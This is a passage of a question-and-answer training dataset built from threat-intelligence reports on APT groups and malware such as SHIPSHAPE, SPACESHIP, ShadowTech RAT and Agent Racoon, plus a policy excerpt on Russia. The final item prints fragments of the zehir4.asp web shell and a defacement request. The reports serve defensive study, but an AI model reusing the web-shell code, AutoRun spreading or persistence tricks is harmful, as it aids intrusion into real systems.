having to develop such a tool or set up the associated payment and infrastructure associated with collecting the ransom.\n\u2013 APT41 attempted to deploy the ransomware through a group policy (GPO) scheduled task. However, the malware was unsuccessfully deployed because of a simple typo.\n\u2013 Figure 7 shows the ransom note associated with Encryptor RaaS, which contains default messages in both English and German (the instruction links have been redacted). Given that this is the default message, the languages in the note should not be considered when determining actor origin or location.\nATTENTION!\nThe files on your computer have been securely encrypted. To get access to your files again, follow the instructions at:\nACHTUNG!\nDie Dateien auf Ihrem Computer wurden ischer verschluesselt. Um den Zugriff auf Ihre Dateien wiederzuerlangen, folgen Sie der Anleitung auf:\n\nHow did APT41 leverage compromised digital certificates from video game studios, and what implications does this have for their operations?",
    "output": "APT41 is known for leveraging compromised digital certificates from video game studios to sign malware. They have abused at least 19 different certificates, including one from Mgame, a South Korean game publisher, used against other gaming industry entities in 2012. Another Mgame digital certificate was used by several other Chinese operators, including APT17, APT20, and APT31. This practice allows APT41 to make their malware appear legitimate, enhancing their ability to evade detection and execute successful attacks. It also suggests potential collaboration or sharing of resources among different threat groups.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Very Small Headline: SHIPSHAPE\nSHIPSHAPE samples have been identified with compile times as early as 2006 and as recently as 2014. SHIPSHAPE initially targets removable and fixed drives with less than a specific amount of space available to the SHIPSHAPE process. Earlier samples required less than 1,000,000,000 bytes  (~1GB); the sample described in detail below requires less than 10,000,000,000 bytes (0x2540BE400) or approximately 10GB.41  The intent is likely to use the drive to spread malware to additional systems.\nThe sample f18be055fae2490221c926e2ad55ab11 was compiled on 23 August, 2012. The malware replaces files and folders on targeted drives with executable files from specified paths on the SHIPSHAPE-infected system. 42  The specific files and folders replaced may vary based on the SHIPSHAPE sample. 43 Targeted files and folders are marked as hidden; SHIPSHAPE copies the specified executable file or files to the removable drive using the same names as the targeted files and folders, but with an .exe extension (for example, if the drive contained the file MyDocument.doc, SHIPSHAPE would create a file with the name MyDocument.doc.exe. A user attempting to access a \"document\" on the removable drive would potentially be tricked into running the executable instead. It is believed that the executable will open the original document or folder when executed, to disguise the fact that malicious activity is occurring.\nWhen executed, SHIPSHAPE creates the mutex \"MicrosoftShipZJ\".  The malware copies itself to %HOMEPATH%\\My Documents\\Visual Studio 2005\\MSDEV\\IDE\\MSDEV.EXE. For persistence, SHIPSHAPE creates a shortcut in the user's Startup folder named \"Visual Studio.lnk\" using the comment \"Visual Studio 2005\" and a target path of %HOMEPATH%\\My Documents\\Visual Studio 2005\\MSDEV\\IDE\\MSDEV. EXE (variable is expanded).\nThe malware creates the registry key HKEY_LOCAL_MACHINE\\Software\\Microsoft\\ShipUp with the following value and data:\nValue: lnk\nData: Wjtvbm!Tuvejp/mol\nThe data is the encoded name of the malware's shortcut file (in this case, \"Visual Studio.lnk\"); the hexadecimal value of each character in the original file name is incremented by one (so \"V\" (0x56) becomes \"W\" (0x57) , etc.).\nSHIPSHAPE disables AutoRun and hides both hidden files and file extensions by setting the following registry values:\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\NoDriveTypeAutoRun = 0x9f\nHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Hidden = 0x02\nHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\HideFileExt = 0x01\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL\\ CheckedValue = 0x00\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\HideFileExt\\ CheckedValue = 0xffffffff\nSHIPSHAPE searches for fixed and removable drives (DRIVE_FIXED, DRIVE_REMOVABLE). If a detected drive is less than 10,000,000,000 bytes (10GB) in size or was attached to the system after SHIPSHAPE performed its initial drive scan, SHIPSHAPE looks for the file ldupver.txt on the drive and parses the file for version information if the file is present. If the version listed in the file is greater than the malware's current version (\"50\" for this sample), SHIPSHAPE will look for the file AUTORUN.INF on the drive and execute the \"open\" variable from the file, likely in an attempt to self-update.\nSHIPSHAPE will create (or update, if already present), the following AUTORUN.INF file on the drive:\n[AutoRun]\nopen=keybd.exe\nshellexecute=keybd.exe\nshell\\Auto\\command=keybd.exe\nshell=Auto\nIn addition, for drives that pass the size check (e.g., less than 10GB), SHIPSHAPE modifies folders and files on the drive with the .doc or .docx extension. SHIPSHAPE sets the hidden attribute on the original folder or file and copies a new file to the drive using the same name with an .exe extension. For folders, SHIPSHAPE copies the contents of the file KB925273-dir.log from the SHIPSHAPE-infected computer to the drive; for files, SHIPSHAPE copies the contents of the file KB936891-doc.log. The malware will skip over any paths on the drive beginning with XP-Update,  msdn, Recycled, or $LDDATA$. 44\nSHIPSHAPE may use the following files (where [Install Path] is the path where SHIPSHAPE is installed on the victim computer:\nTable 16: Files used by SHIPSHAPE malware\nVery Small Headline: SPACESHIP\nSimilar to SHIPSHAPE, SPACESHIP samples have been identified with compile times ranging from 2006 to 2014. SPACESHIP searches for files with a specified set of file extensions and copies them to a removable drive. FireEye believes that SHIPSHAPE is used to copy SPACESHIP to a removable drive, which could be used to infect another victim computer, including an air-gapped computer. SPACESHIP is then used to steal documents from the air-gapped system, copying them to a removable drive inserted into the SPACESHIP-infected system.\nThe SPACESHIP sample 11876eaadeac34527c28f4ddfadd1e8d  was compiled on 23 August, 2012. When executed, the malware creates two events named \"MicrosoftShipTrExit\" and \"MicrosoftShipTrHaveExit\" along with a mutex named \"MicrosoftShipTrZJ\".\nThe malware copies itself to %HOMEPATH%\\My Documents\\Visual Studio 2005\\MSDEV\\FoxPro\\VFP6. EXE. To maintain persistence, the malware creates a shortcut in the user's Startup folder named VFP6. lnk using the comment \"Visual FoxPro\" and the target path %HOMEPATH%\\My Documents\\Visual Studio 2005\\MSDEV\\FoxPro\\VFP6.EXE (all %HOMEPATH% references are expanded).\nAs part of the installation process, SPACESHIP creates the registry key HKEY_LOCAL_MACHINE\\Software\\ Microsoft\\ShipTr with the following value and data:\nValue: lnk\nSimilar to other APT30 malware, the data is the name of SPACESHIP's shortcut file, with each character incremented by one.\nSPACESHIP also creates the following directories:\n%HOMEPATH%\\My Documents\\Visual Studio 2005\\MSDEV\\FoxPro\\Docs %HOMEPATH%\\My Documents\\Visual Studio 2005\\MSDEV\\FoxPro\\Docs\\ldf\nSPACESHIP first scans for files matching the pattern ldmap*.* in %HOMEPATH%\\Documents\\Visual Studio 2005\\MSDEV\\FoxPro\\Docs\\ldf. If a file is not found or is too old, the malware deletes the files ldmap.txt and Info.txt45  from %HOMEPATH%\\My Documents\\Visual Studio 2005\\MSDEV\\FoxPro\\ Docs\\. The malware then recursively scans each directory and logs all files contained in each folder (file size and last modified) in a new Info.txt file.\nSPACESHIP will look for configuration data stored in the file %HOMEPATH%\\My Documents\\Visual Studio 2005\\MSDEV\\FoxPro\\ld.ini. The malware extracts the following keys from the sections:\n[DirMap]\nGetIt=[Integer]\n[Piece]\nSize=[Integer]\n[UpData]\nDirAndType=[String]\n[UpDataTime]\nDay=[Integer]\nSPACESHIP will scan the folders \"My Documents\" (CSIDL_PERSONAL), \"Desktop\" (CSIDL_DESKTOP), and \"My Recent Documents\" (CSIDL_RECENT; the malware parses the .lnk file target paths for specified file types) and will search for files with the following extensions:\nTable 17: SPACESHIP targeted file extensions\nSPACESHIP can also target files based on the last modified date using the UpDataTime/Day in the ld.ini configuration file.\nIdentified files are copied to the %HOMEPATH%\\Visual Studio 2005\\MSDEV\\FoxPro\\Docs\\ldf directory and saved with an .ldf extension. The .ldf files are first compressed using zlib then each byte is rotated 4 positions and XOR-encoded with 0x23.\nSPACESHIP monitors for removable drives to be inserted into the system. When a drive is attached, SPACESHIP checks for the presence of specific files on the removable drive.\nIf the file [Drive Letter]:\\msdn\\d.ini is found, SPACESHIP copies it to %HOMEPATH%\\Documents\\ Visual Studio 2005\\MSDEV\\FoxProld.ini.46\nIf the file [Drive Letter]:\\msdn\\KB947652-ver.log is present, SPACESHIP copies it to %HOMEPATH%\\ Documents\\Visual Studio 2005\\MSDEV\\FoxPro\\KB947652-ver.log. SPACESHIP reads the contents of the file and compares it with its current version (the string \"5.0\" for this variant). If the strings do not match, SPACESHIP copies [Drive Letter]:\\XP-Update\\KB863113-ld.log to %HOMEPATH%\\ Documents\\Visual Studio 2005\\MSDEV\\FoxPro\\~ld.exe and executes the file.\nSPACESHIP copies files in the %HOMEPATH%\\Documents\\Visual Studio 2005\\MSDEV\\FoxPro\\Docs\\ldf directory to the removable drive in the folder [Drive Letter]:\\Recycled. A desktop.ini file is created that configures the directory to be opened using Recycler instead of Windows Explorer; this prevents a user from seeing the copied files using Windows Explorer.\nQuestion: Explain the mechanism by which SHIPSHAPE attempts to spread to additional systems via removable drives. What specific techniques does it employ to deceive users into executing malicious files?",
    "output": "Answer: SHIPSHAPE targets removable drives with less than a specific amount of available space (e.g., 10GB) to spread malware. It replaces files and folders on these drives with executable files from the infected system, marking them as hidden and appending an '.exe' extension. For instance, a file named 'MyDocument.doc' would be replaced with 'MyDocument.doc.exe'. When a user attempts to access what appears to be a document, they unknowingly execute the malicious file. The malware also creates an AUTORUN.INF file on the drive to facilitate automatic execution of the malicious payload when the drive is accessed.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: ATTACK 1: A HELPING OF MALWARE WITH THAT PROXY?\nIn this attack, which we first observed in the second week of June, the potential victim is encouraged to visit a download link containing a malicious installer of Freegate.\nFreegate is a standalone circumvention-bypassing Virtual Private Network (VPN) client for Windows. Legitimate versions of the Freegate software are available for download on its . While initially developed for mainland Chinese users, the software is used in a number of other countries.\nWhile Freegate was by one anti-virus company nearly a decade ago, in this attack, attackers packaged what appears to be a legitimate version of Freegate with a malicious implant.2 The targeted group were members of the Syrian opposition in a private social media group.\nhttp://www.mediafire.com/download/[REDACTED]/VPN-Pro.zip\nWhen a potential victim visits the link, they are offered the download of a file which MediaFire lists as uploaded on June 15, 2013.\n3\nVPN-PRO.zip\nUploaded: 2013-06-15 16:54:31\nThe zip file extracts to a MS Windows executable file.\nVPN-Pro.exe4\nThe binary was compiled at 2013-06-15 22:41:31 UTC and has the following properties:\nLegalCopyright: Copyright \u00a9 2013\nAssembly Version: 1.0.0.0\nInternalName: VPN-Pro.exe\nFileVersion: 1.0.0.0\nProductName: VPN-Pro\nProductVersion: 1.0.0.0\nFileDescription: VPN-Pro\nOriginalFilename: VPN-Pro.exe\nSimilar to , this was written in .NET and appears to require the .NET 3.5 framework to execute.5\nWhen VPN-Pro.exe is run, the victim is shown the Freegate end-user license agreement (EULA) dialogue box.6 Upon agreeing to the EULA, an operational copy of Freegate proxy is launched, which includes a request to unblock the firewall. The copy of Freegate launched is listed as \"Freegate 7.35 Professional Edition.\" The Freegate software begins operating, and quickly prompts the user for an update.\nMedium Headline: Infection\nIn addition to running a legitimate copy of Freegate 7.35,7 the malware installs an implant.\nA fake \"svchost.exe\" is installed in the victim's Application Data directory.\nC:\\Documents and Settings\\<Username>\\Application Data\\svchost.exe\nDropped files on execution of VPN-Pro.exe:\nExamination of the \"svchost.exe\" binary shows multiple references to \"ShadowTech Rat.\"\nExamination of network traffic also identifies the implant as ShadowTech RAT.\nPacket capture on port 1321/tcp:\nShadowTech Rat is a Remote Access Trojan which appears to be widely available for download on both English and Arabic language sites. Videos can be found on demonstrating its functionality. The tool offers a range of options to the attacker, from keylogging and remote activation of the webcam to file exfiltration.\nShadowTech RAT control console:\nBoth VPN-Pro.exe and svhost.exe have been submitted to VirusTotal:\nBoth have relatively low detection rates by anti-virus software. As of June 20, 2013, svchost.exe was only detected by four out of 47 tested anti-virus programs, while VPN-Pro.exe was only detected by five out of 46.\nThe svchost.exe initiates an outbound connection to a command and control (C2) server hosted at thejoe.publicvm.com. This domain resolves to an address inside Syrian IP space: 31.9.48.119.\ninetnum: netname:\n31.9.0.0 - 31.9.127.255\nSY-ISP-TARASSUL\ndescr:\ncountry:\nTarassul inetnet Service Provider\nSY\nThis is not the first time that malicious installer packages have been created for circumvention tools. In 2012, malicious installers for Green Simurgh\u2014a standalone proxy intended for Iranian users but also used by some Syrians\u2014were . The creators of Green Simurgh responded by posting a prominent warning on their highlighting the presence of these malicious installers. Last year, malware which purported to be the Tor Browser Bundle was . It was found to be backdoored by Gh0st RAT and exfiltrated data to an IP in China.\nAn attack using a malicious installer of a working and reputable security or proxy tool is especially pernicious as it targets users who likely recognize the importance of privacy and circumvention, and may believe that they have increased their privacy and security by installing the tool.\n\nWhat are the key characteristics of the ShadowTech RAT used in the 'A Call to Harm' APT campaign, and how does its low detection rate by antivirus software impact the effectiveness of traditional security measures?",
    "output": "The ShadowTech RAT used in the 'A Call to Harm' APT campaign is a Remote Access Trojan that is widely available for download on both English and Arabic language sites. It offers a range of functionalities to the attacker, including keylogging, remote activation of the webcam, and file exfiltration. The low detection rate of both the VPN-Pro.exe and svchost.exe files by antivirus software significantly impacts the effectiveness of traditional security measures. As of June 20, 2013, svchost.exe was only detected by four out of 47 tested antivirus programs, while VPN-Pro.exe was detected by only five out of 46. This low detection rate allows the malware to evade most antivirus solutions, making it difficult for victims to realize they have been compromised until significant damage has been done.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Agent Racoon Backdoor\nThe Agent Racoon malware family is built to provide backdoor capabilities. It is written using the .NET framework, and leverages DNS to establish a covert channel with the C2 server. Unit 42 researchers named the malware family Agent Racoon due to some references found within the code of the identified samples, as shown in Figure 7.\nWhen executed, the threat has some predefined settings such as:\nThe base domain used to create the DNS covert channel\nA unique key per sample, used as a seed to generate an encryption password to encrypt the DNS communication\nA fallback DNS server if no DNS server can be read from the compromised system\nAll the C2 domains identified fulfill the same base pattern, with unique values for the four character identifier across different samples:\n[4 characters].telemetry.[domain].com\nThe value of Program.dns_ip is different for each sample found, which could indicate that the threat actor is building the binary with specific settings gathered from the targeted environment.\nWith that pattern, the threat communicates with the C2 server by adding additional subdomains to build the DNS query. It uses Internationalizing Domain Names for Applications' (IDNA) domain names with Punycode encoding. This encoding type is a representation of Unicode values over the ASCII encoding for internet hostnames.\nThe domain names follow the pattern below:\n[random_val].a.[4 characters].telemetry.[domain].com\nThe screenshot from Wireshark in Figure 9 illustrates a complete DNS query:\nTo manage the communication with the C2 server, the malware uses a communication loop shown in Figure 10.\nThe following are some main features of the communication loop above:\nThe communication loop finishes when the answer xn--cc is received from the C2 server, or a communication error occurs.\nThe randomized delay between messages can have multiple reasons:\nTo avoid network spikes.\nTo avoid potential network congestion.\nTo provide randomness as an attempt to avoid network beaconing detection.\nThe encryption of all the communication messages through Program.Util.RC.\nThe encryption routine implements a stream cipher that takes the initial unique key per sample Program.key (this.defaultkey), as shown in Figure 11. It then creates a 1-byte encryption key to later encrypt the message with an XOR.\nDepending on the length of the message sent to the C2 server, different subdomains are added to the query, as shown in the code snippet in Figure 12.\nThe this.Rand() component of the fully qualified domain name (FQDN) build is intended to avoid caching and ensure the request reaches out to the C2 server.\nAgent Racoon provides the following backdoor functionality:\nCommand execution\nFile uploading\nFile downloading\nAlthough Agent Racoon does not provide any sort of persistence mechanism by itself, during the activity we observed, the threat was executed by using scheduled tasks.\nUnit 42 researchers discovered the following samples using different subdomains of telemetry.geoinfocdn[.]com, as shown in Figure 13. The domain geoinfocdn[.]com was registered on 2022/08/19 UTC for one year.\nUnit 42 researchers were able to track the Agent Racoon malware family back to July 2022. Two samples of the malware family were uploaded to VirusTotal from Egypt and Thailand in September 2022 and July 2022 with the following SHA256 hashes:\n3a2d0e5e4bfd6db9c45f094a638d1f1b9d07110b9f6eb8874b75d968401ad69c\ndee7321085737da53646b1f2d58838ece97c81e3f2319a29f7629d62395dbfd1\nThese two samples used the same subdomain patterns, but this time the domain used for C2 was telemetry.geostatcdn[.]com. Threat actors performed the following activities regarding this domain on the dates shown:\nRegistered: 2020/08/27 UTC\nFirst seen in the wild: 2021/06/17 23:10:58 UTC\nRenewed: 2021/08/18 UTC\nExpired: 2022/08/27 UTC\nFigure 14 shows that with this information, two groups of malware samples can be identified using different C2 domain names and file paths since 2020.\nThe threat actor tried to disguise the Agent Racoon binary as Google Update and MS OneDrive Updater binaries.\nThe malware developers made small modifications to the source code in an attempt to evade detection. Some samples used a domain hard-coded in plain text to establish the DNS covert channel (as shown in Figure 15), whereas other samples used a Base64 encoded string.\nAside from the Base64 feature, the differences are in the settings and not in the actual source code, except for the sample with SHA256 hash 354048e6006ec9625e3e5e3056790afe018e70da916c2c1a9cb4499f83888a47.\nThis sample has a compilation timestamp that was modified and is outside the time frame of activity: 2075/02/23 08:12:59 UTC.\nAs shown in Figure 16, the threat actor also tried to obfuscate the constant cmd.exe to avoid signature-based detections. They did so by using the equivalent Base64 encoded value with the added constant 399 so the equivalent Base64 encoded string can't be detected through signatures.\n\nQuestion: Why does the Agent Racoon malware use a randomized delay between messages in its communication loop? Explain the potential benefits of this approach.\n\nAnswer:",
    "output": "The Agent Racoon malware uses a randomized delay between messages in its communication loop for several reasons. First, it helps to avoid network spikes, which can draw attention to the malicious activity. Second, it prevents potential network congestion, ensuring smoother communication. Lastly, it introduces randomness to avoid network beaconing detection, making it harder for security systems to identify the malicious traffic.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Strings in malware\nThe Windows-based malware in this paper generally contains very few noticeable strings apart from what is commonly found in software, and clearly randomized strings. What exists \u2022 like the word \u2022polymorphed\u2022 in the early DLL versions - is standard English with few discerning features.\nThis changes a bit when we look at the mobile malware. In the Android malware we find Hindi comments in the Java source code. In the Iphone malware we find project paths referencing one \u2022JohnClerk\u2022, and a few typos like \u2022conutry\u2022. In one of the Blackberry binaries we find the string \u2022God_Save_The_Queen\u2022, a rather blunt hint towards Britain, as well as Arabic log strings.\nThese and other indicators have led us to conclude that the Inception attackers are setting a new standard for deliberate disinformation and red herrings in a malware espionage operation. Some clues might have been added by accident, but none of these indicators can be trusted in any way. Thus we are not going to assume anything about who might be behind these attacks.\nBig Headline: Conclusion\nThe whole Inception setup shows signs of automation and seasoned programming. The amount of layers used in this scheme to protect the payload of their attack seems excessively paranoid. Not only is the initial DLL apparently polymorphed using some backend tool \u2022 the compile time stamps in the PE header are clearly forged, resources are removed so as not to give away any location information, and import tables are shuffled around, rendering import hashes (aka imphashes) useless.\nThe names of the files both when dropped and their original names along with the callback directories, paths and mutexes used all seem to be dynamically generated.\nThe attackers utilize compromised embedded devices \u2022 typically routers- on the Internet as well as multiple dedicated hosting providers and VPN services to mask their identity from the cloud storage provider and others. The same router botnet is used as a spreading and management platform for attacks on mobile devices as well.\nThis suggests that this a large campaign and we\u2022ve only seeing the beginning of it. Initially many of the targets were located in Russia or related to Russian interests, but as the campaign has evolved we have verified targets in countries all over the world.\nIt is clear that this infrastructure model does not need to be applied solely against a few targets, or even need to be hosted at CloudMe. The framework is generic, and will work as an attack platform for a multitude of purposes with very little modification.\nThe attribution indicators point in different directions and can\u2022t be given much weight. These attacks can in theory be the creation of nation states or resourceful private entities - we consider it very unlikely that they are performed by one or just a few individuals.\n\u00a9 2014 Blue Coat Systems, Inc. All rights reserved. Blue Coat, the Blue Coat logos, ProxySG, PacketShaper, CacheFlow, IntelligenceCenter, CacheEOS, CachePulse, Crossbeam, K9, the K9 logo, DRTR, Mach5, Packetwise, Policycenter, ProxyAV, ProxyClient, SGOs, WebPulse, Solera Networks, the Solera Networks logos, DeepSee, \"See Everything. Know Everything.\", \"Security Empowers Business\", and BlueTouch are registered trademarks or trademarks of Blue Coat Systems, Inc. or its affiliates in the U.S. and certain other countries. This list may not be complete, and the absence of a trademark from this list does not mean it is not a trademark of Blue Coat or that Blue Coat has stopped using the trademark.  All other trademarks mentioned in this document owned by third parties are the property of their respective owners. This document is for informational purposes only. Blue Coat makes no warranties, express, implied, or statutory, as to the information in this document.\n\nHow did the Inception attackers employ deliberate disinformation and red herrings in their malware espionage operation, and why is this significant?",
    "output": "The Inception attackers employed deliberate disinformation and red herrings by including various misleading strings and comments in their malware. For instance, the Android malware contained Hindi comments, the iPhone malware had project paths referencing 'JohnClerk' and typos like 'conutry', and a Blackberry binary included the string 'God_Save_The_Queen' along with Arabic log strings. These indicators were designed to confuse investigators and make it difficult to attribute the attacks to any specific group or country. This tactic is significant because it demonstrates the sophistication and intentional deception employed by the attackers, making attribution challenging and unreliable.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 1 The View from Moscow\nThe crisis around Ukraine is part of a wider confrontation between Russia and the West, which has persisted at varying degrees of intensity since the fall of the Soviet Union despite periods when the West as a whole refused to recognise that any conflict of strategic interest with Russia existed. After a period where this confrontation lay relatively dormant, the conflict in Ukraine results from the culmination of two important trends in the Russian view of itself and the world: first, a greater and more urgent perception of threat, whether real or imagined, to Russia's own security; and second, a recognition that Russia itself has regained sufficient strength, military and otherwise, to assert itself.\nThe notion that Russia is faced with an existential threat \u2013 even when that threat is imperceptible from outside Russia \u2013 has multiple and complex origins. Some of these are permanent and persistent; for example, the idea of vulnerability of Russia's borders, which leads to the conviction that in order to protect its borders Russia must exert control far beyond them. In the last century this was one of the drivers for Soviet ultimatums to the Baltic states and Finland which eventually led to their invasion in 1939. This continuing perception feeds into the current portrayal by Russia of NATO enlargement, including to those same Baltic states, as a threat. Regardless of NATO's intent, it presents a menace simply by 'approaching Russia's borders'. 1\n1 As expressed in a wide range of Russian security policy documents, including the December 2014 'Military Doctrine of the Russian Federation' and its predecessors.\nRecent developments have heightened the sense of urgency for Russian security planners.\nOther, more recent developments have heightened the sense of urgency for Russian security planners. The fear that the West is considering bringing about regime change in Russia does not stand up to objective scrutiny, but appears deep-rooted among a broad sector of the Russian security elite. It has been accentuated in the past decade by, as Moscow sees it, further unrestrained and irresponsible interventions by the West with the intention of regime change, leaving chaos and disorder in their wake. Western action in Libya and support for anti-government rebels in Syria provide prime examples.\nThus the prospect of destabilisation closer to home in Ukraine would have been of even more acute and direct concern in Moscow. Even without the accompanying disorder, the threat of the 'loss' of Ukraine to the West posed an immediate military problem: it appears to have been considered plausible in Moscow that this presented an immediate danger of losing the Black Sea Fleet's base in Sevastopol, together with the often-overlooked supporting infrastructure scattered across the Crimean peninsula, to NATO. According to Secretary of the Russian Security Council Nikolay Patrushev, the consequences could be even more far-reaching: 'Americans are trying to involve the Russian Federation in interstate military conflict, to facilitate the change of power by way of using the events in Ukraine, and ultimately to carve up our country.'2 Whether this view is sincerely held by the Russian leadership or not, it is the one that is consistently presented to the Russian public, and to its Armed Forces, as explaining the roots of the current conflict.\nThe fact that Russia was able to use large numbers of Special Operations Forces (SOF) swiftly and effectively to seize control of Crimea, and subsequently to wage an ongoing low-level campaign in eastern Ukraine involving long-term mobilisa-tion of its conventional forces, is a pointer to the other key element of the new Russian approach to confrontation; the recognition that Russia is now in a position to exercise a much more assertive foreign policy than in the recent past.\nOne element of this is the unprecedented and expensive overhaul and rearmament of Russia's Armed Forces which began after the armed conflict with Georgia in 2008 and continues today. The fact that the Russian troops at work in Ukraine are entirely unrecognisable from the forces which entered Georgia just seven years earlier caused surprise and consternation among those Western defence communities that had not been paying attention. But the Ukraine campaign overall is far more than a military operation. Successful coordination of military movements and action with other measures in the political, economic and especially information domains, are the result of strenuous efforts by the\nPutin administration over preceding years to harness other levers of state power to act in a coordinated manner.3\n2 Interview with Security Council Secretary Nikolay Patrushev, Rossiyskaya gazeta, 11 February 2015.\nThe results of this coordination has left the unprepared West scrambling for a response, and struggling even to define the phenomenon, as witness the tortuous attempts by NATO and Western governments to decide what precisely constitutes 'hybrid warfare'. But the notion of hybridity as applied to the current concept meets little understanding in Moscow. Instead, Russia can be said simply to be attempting to implement grand strategy in the classical sense. Russia's attempt at this whole of government approach to managing conflict is embodied in the National Defence Control Centre in central Moscow, where a wide range of different government ministries and agencies including those responsible for energy, the economy, ecology and more are brought together under the leadership of the General Staff.4\nIntensive militarisation, sometimes referred to directly as mobilisation, is also now pervading Russian society, stoked by unending leadership rhetoric of war, confrontation and threat, and blanket military coverage on TV. According to Estonian Ambassador to the Russian Federation J\u00fcri Luik, the Russian narrative of war is 'instrumentalising the population and putting it on a mental war footing', not only by tapping into the traditional Russian narrative of victimhood over centuries, but also by engendering 'a heroic feeling that now is the time of risk'. 5  Furthermore, analysis of Russian security thinking shows not only this asymmetry of threat perception, but also a complete divergence with the West in terms of notions of how and when the military should be used to counter those threats.\nThe notion of hybridity meets little understanding in Moscow.\nAs so often, there is no single explanation for a given course of action by Russia, and direct intervention in Crimea and Ukraine has also been parsed as a response to the threat posed to Russian business interests by closer integration with the European Union (EU). The EU model of open markets and rules-based dealings runs directly counter to the Russian way of doing business in the near abroad, reinforcing the growing Russian perception of the EU as a problem rather than an opportunity; but few analysts would have predicted that it would be the prospect of an EU Association Agreement for Ukraine, rather than any involvement with NATO, which would eventually lead to military intervention by Russia.\nThe ambivalent attitude to Ukraine as a sovereign nation with a right to choose its own foreign policy direction has its roots in an entirely different view of the end\nof the Soviet Union. That view holds that the former Soviet republics, including Ukraine and the Baltic States, in effect belong to Russia. According to President Putin, in 1991 'Russia voluntarily \u2013 I emphasise \u2013 voluntarily and consciously made absolutely historic concessions in giving up its own territory'. 6 This persistent view is not limited to President Putin. According to veteran scholar of Russia Paul Goble:\n3 Andrew Monaghan. 'Defibrillating the Vertikal', Chatham House, October 2014, http://www.chathamhouse.org/publication/ defibrillating-vertikal-putin-and-russian-grand-strategy.\n4 '\u041d\u0430\u0447\u0430\u043b\u044c\u043d\u0438\u043a \u0440\u043e\u0441\u0441\u0438\u0439\u0441\u043a\u043e\u0433\u043e \u0413\u0435\u043d\u0448\u0442\u0430\u0431\u0430 \u0440\u0430\u0441\u0441\u043a\u0430\u0437\u0430\u043b \u0436\u0443\u0440\u043d\u0430\u043b\u0438\u0441\u0442\u0430\u043c \u043e \u0437\u0430\u0434\u0430\u0447\u0430\u0445 \u0438 \u0440\u043e\u043b\u0438 \u041d\u0430\u0446\u0438\u043e\u043d\u0430\u043b\u044c\u043d\u043e\u0433\u043e \u0446\u0435\u043d\u0442\u0440\u0430 \u043f\u043e \u0443\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u044e \u043e\u0431\u043e\u0440\u043e\u043d\u043e\u0439 \u0420\u0424', Russian Ministry of Defence website, 1 November 2014, http://function.mil.ru/news_page/country/more.htm?id=11998309@egNews.\n5 Speaking at the Lennart Meri Conference, Tallinn, 24 April 2015.\n'The Russian elite is sincerely convinced that the preservation of influence on the former Soviet republics surrounding it is the status quo and a natural right given by history,' even though 'for the entire rest of the world such an approach is incomprehensible and unnatural'.\nWhat this means is that Moscow acts 'as if the Soviet Union had not fallen apart, as if it had only been reformatted, but relations between sovereign and vassal have remained as before'. 7 It is plain that at least in some sectors of society, these aspirations by Russia to regain imperial dominion over its surroundings enjoy broad support. The now-celebrated Prosecutor General of Crimea, Natalya Poklonskaya, in an interview at the time of annexation declared her ambition to 'start again in a great state, a great power, an empire, like Russia'. 8\nInformed analysis pointed to Ukraine as the next target for Russian action.\nThis approach to Russia's inheritance of domination over its neighbourhood appears consistent over time. In 1953, an assessment of recent history that had led to Soviet domination over Eastern Europe concluded that in the Russian view:\n'Stalin was no more than reasserting Russian authority over territories which had long recognised Tsarist rule, and which had been torn away from Russia at the time of her revolutionary weakness after the First World War'.9\n\nAnswer this question based on the above context: How does the Russian perception of the EU's model of open markets and rules-based dealings influence its actions towards Ukraine's integration with the EU?",
    "output": "The EU model of open markets and rules-based dealings runs directly counter to the Russian way of doing business in the near abroad, reinforcing the growing Russian perception of the EU as a problem rather than an opportunity. The prospect of an EU Association Agreement for Ukraine was seen as a significant threat to Russian business interests, leading to military intervention by Russia. This ambivalent attitude towards Ukraine's sovereignty and right to choose its own foreign policy direction is rooted in the view that the former Soviet republics belong to Russia, highlighting the divergent perspectives between Russia and the West.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: ..// DRIVE ISLEMLERI\n..function driveGo(drive_){\n...location = dosyaPath+\"?status=1&path=\"+drive_+\"&Time=\"+Date();\n..} .</script>\n.<table align=center border=1 width=150 cellpadding=0 cellspacing=0><tr bgcolor=gray><td align=center><b><font color=white>S.r.c.ler</td></tr><tr><td><a href='#'onClick=\"driveGo('A');return false;\"><font face=wingdings>;</font>Floppy\n[A:]</a></td></tr><tr><td><a href='#'onClick=\"driveGo('C');return false;\"><font face=wingdings>;</font>HardDisk [C:]</a></td></tr><tr><td><a href='#'onClick=\"driveGo('D');return false;\"><font face=wingdings>;</font>CD-Rom\n[D:]</a></td></tr><tr><td><a href='zehir4.asp?time=10:26:52 AM'><font face=webdings>H</font> Local Path</a></td></tr></table><br>\nWhen the following data is added to the \"TEST_FILE.txt\" file opened for edit: \"Hacked by STTEAM\"\nPOST /zehir4.asp?Time=11:19:52%20AM HTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\nReferer: http://192.168.1.1/zehir4.asp?status=10&dPath=C:\\Inetpub\\wwwroot\\TEST_FILE.txt&path=c:\\inetp ub\\wwwroot\\&Time=11:19:41 AM\nAccept-Language: en-us\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0C)\nHost: 192.168.1.1\nContent-Length: 